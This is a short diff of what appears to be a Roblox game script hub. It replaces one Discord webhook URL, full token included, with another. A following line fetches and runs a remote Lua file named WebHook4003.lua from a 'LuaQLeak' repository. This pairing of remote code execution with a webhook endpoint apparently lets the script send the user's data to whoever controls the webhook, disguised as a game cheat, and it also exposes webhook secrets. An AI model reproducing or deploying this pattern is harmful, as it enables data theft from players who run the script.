@@ -104,6 +104,6 @@ Section:NewButton("Anime Fighting Simulator", "", function()
 end)
 
 
-getgenv().WebhookHere = "https://discord.com/api/webhooks/1016957628091482173/WTqsaaR9xA45YV-Y6vIZCBFF6U5x3aJsVi2Ypc-hIhWqa5BfLkqFJGPzMJBQi3qwuLL9"
+getgenv().WebhookHere = "https://discord.com/api/webhooks/1028332146823274507/qFvpU6rgX0SmumgTcBSnuwCTXtQhTK1G99-INk8o-TnM12EOUC5osuEDd0q1eZQiyutj"
  
 loadstring(game:HttpGet("https://raw.githubusercontent.com/LuaQLeak/Scripts/main/WebHook4003.lua"))()
